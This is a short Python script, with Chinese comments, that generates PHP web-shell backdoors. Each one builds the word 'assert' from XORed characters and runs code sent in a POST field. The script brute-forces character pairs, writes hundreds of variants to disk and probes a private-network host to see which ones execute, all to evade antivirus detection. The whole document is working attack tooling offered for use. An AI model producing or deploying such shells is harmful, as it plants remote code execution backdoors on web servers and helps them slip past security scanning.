# -*- coding:utf-8 -*-
# php 异或免杀,后门代码(无字符后门)：
# <?php $a= ("!"^"@").'ssert'; $a($_POST[x]);?>

import requests


for i in range(1, 127):
    for j in range(1, 127):
        code = "<?php $a= ('" + chr(i) + "'" + '^' + "'" + chr(j) + "')" + ".'ssert'; $a($_POST[x]);?>"
        with open(r'E:/Sec/Language/Python/Project/Scanner/demo3/payload/' + str(i) + '_' + str(j) + '.php', 'a') as f:
            f.write(code)
            f.close()
        url = 'http://192.168.110.34/payload/' + str(i) + '_' + str(j) + '.php'
        # print(url)
        data = {
            'x': 'phpinfo();'
        }
        try:
            res = requests.post(url=url, data=data).content.decode('utf-8')
            if 'php' in res:
                print(str(i) + '_' + str(j) + '.php')
        except Exception as e:
            pass